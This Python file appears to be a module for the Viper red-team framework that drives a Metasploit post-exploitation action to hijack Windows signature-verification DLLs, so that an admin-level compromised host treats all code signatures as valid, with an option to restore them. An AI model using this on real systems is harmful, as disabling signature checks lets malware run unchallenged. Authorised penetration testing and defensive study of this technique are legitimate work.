# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "劫持Windows数字签名认证"
    DESC_ZH = "修改Windows默认数字证书认证文件,使系统默认认证所有数字签名有效.\n" \
              "模块会影响系统所有exe的运行签名认证,请谨慎使用."

    NAME_EN = "Hijacking Windows digital signature authentication"
    DESC_EN = "Modify the Windows default digital certificate authentication program so that the system certifies that all digital signatures are valid by default.\n" \
              "The module will affect the running signature authentication of all exe in the system, please use it with caution."
    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1116"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/muinbs"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1116/"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionEnum(name='action',
                   tag_zh="操作",
                   desc_zh="Hijack表示劫持数字签名DLL,Recovery表示恢复系统默认数字证书DLL",
                   tag_en="Action",
                   desc_en="Hijack means hijacking the digital signature DLL, and Recovery means restoring the system default digital certificate DLL",
                   required=True,
                   default="Hijack",
                   enum_list=[
                       {'tag_zh': "劫持", 'tag_en': "Hijack", 'value': "Hijack"},
                       {'tag_zh': "恢复", 'tag_en': "Recovery", 'value': "Recovery"},
                   ]),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/pe_signing_auth_hijack"

    def check(self):
        """执行前的检查函数"""
        action = self.param("action")
        session = Session(self._sessionid)
        if session.is_alive:
            pass
        else:
            return False, "Session不可用", "Session is unavailable"
        if session.is_admin:
            pass
        else:
            return False, "此模块需要管理员权限,请尝试提权", "This module requires administrator privileges, please try privilege escalation"

        self.set_msf_option("Action", action)
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"运行模式: {data}", f"Operating mode: {data}")
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(f"运行模式: {data}", f"Operating mode: {data}")
